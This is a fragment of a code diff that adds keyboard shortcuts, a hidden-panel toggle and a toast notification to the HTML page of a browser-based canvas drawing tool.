+		  const toolbar = document.querySelector('.canvas-toolbar');
+		  const wrapper = document.getElementById('canvasWrapper');
+		  const secret = document.getElementById('secretContainer');
+		  if(secret.classList.contains('active')){
+			secret.classList.remove('active');
+			toolbar.style.display = 'flex';
+			wrapper.style.display = 'flex';
+		  } else {
+			secret.classList.add('active');
+			toolbar.style.display = 'none';
+			wrapper.style.display = 'none';
+		  }
+		}
+	  }
+	  if(e.key=='Escape') cancelShape();
+	  if(e.key==='+'||e.key==='=') zoomIn();
+	  if(e.key==='-') zoomOut();
+	  if(e.key==='0') zoomFit();
+	  if((e.key==='Delete'||e.key==='Backspace')&&layers.length){ layers.pop(); render(); rebuildLayers(); saveHist(); }
+	});
+
+	let toastTmr;
+	function toast(msg){ const el=document.getElementById('toast'); el.textContent=msg; el.classList.add('on'); clearTimeout(toastTmr); toastTmr=setTimeout(()=>el.classList.remove('on'),2700); }
+
+	updDisplays(); rebuildLayers();
+	</script>
+	</body>
+	</html>
+</div>
 </body>
 </html>
